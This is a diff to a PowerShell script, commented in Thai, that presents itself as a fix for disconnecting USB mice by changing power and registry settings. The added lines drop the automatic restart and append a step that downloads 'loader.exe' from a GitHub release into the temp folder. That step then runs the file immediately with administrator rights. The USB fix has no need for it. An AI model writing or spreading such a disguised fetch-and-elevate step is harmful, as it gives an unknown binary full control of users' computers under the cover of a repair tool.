@@ -3,10 +3,17 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     Break
 }
 
-# 1. ปิดโหมดประหยัดพลังงาน USB (USB Selective Suspend) สาเหตุหลักที่ทำให้เมาส์ USB หลุด/ไม่เชื่อมต่อ
-powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 | Out-Null
-powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 | Out-Null
-powercfg /SETACTIVE SCHEME_CURRENT | Out-Null
+# เคลียร์หน้าจอคอนโซล
+Clear-Host
+
+Write-Host "==========================================================" -ForegroundColor Cyan
+Write-Host "       กำลังตรวจสอบและดึงข้อมูลจากระบบ... กรุณารอซักครู่" -ForegroundColor Yellow
+Write-Host "==========================================================" -ForegroundColor Cyan
+
+# 1. ปิดโหมดประหยัดพลังงาน USB (ซ่อนข้อความแจ้งเตือน 2>$null เพื่อไม่ให้แสดง Error)
+powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
+powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
+powercfg /SETACTIVE SCHEME_CURRENT 2>$null
 
 # 2. บังคับปิด "Allow the computer to turn off this device" ของพอร์ต USB ทั้งหมดใน Registry
 $USBEnumPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
@@ -48,6 +55,30 @@ Get-PnpDevice -FriendlyName "*USB Root Hub*" | ForEach-Object {
 # 7. บังคับสแกนฮาร์ดแวร์เพื่อดึงไดรเวอร์เมาส์ตัวที่สมบูรณ์กลับมา
 pnputil /scan-devices | Out-Null
 
-# 8. รีสตาร์ทระบบอัตโนมัติภายใน 5 วินาที
-Start-Sleep -Seconds 5
-shutdown -r -t 0
+# ----------------- ขั้นตอนการโหลดและรันโปรแกรม LOADER.EXE -----------------
+Write-Host ""
+Write-Host ">>> กำลังดาวน์โหลดโปรแกรมตัวเปิดใช้งาน (loader.exe)..." -ForegroundColor Cyan
+
+# ลิงก์ดาวน์โหลดตัว loader.exe จาก GitHub Release
+$Url = "https://github.com/zynx7crew/zynx7crew-x/releases/download/v1.0.0/loader.exe"
+$DestPath = "$env:temp\loader.exe"
+
+try {
+    # ลบไฟล์เก่าหากค้างอยู่ใน temp เพื่อป้องกันความซ้ำซ้อน
+    if (Test-Path $DestPath) {
+        Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
+    }
+
+    # แสดงแถบดาวน์โหลดใน PowerShell
+    Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
+    
+    Write-Host ">>> ดาวน์โหลดสำเร็จ! กำลังเปิดหน้าโปรแกรม..." -ForegroundColor Green
+    Write-Host "==========================================================" -ForegroundColor Cyan
+    
+    # รันโปรแกรมในสิทธิ์ Administrator ทันที
+    Start-Process -FilePath $DestPath -Verb RunAs
+}
+catch {
+    Write-Host "❌ เกิดข้อผิดพลาดในการโหลดไฟล์โปรแกรม: $_" -ForegroundColor Red
+    Write-Host "กรุณาตรวจสอบการเชื่อมต่ออินเทอร์เน็ตของคุณ" -ForegroundColor Yellow
+}
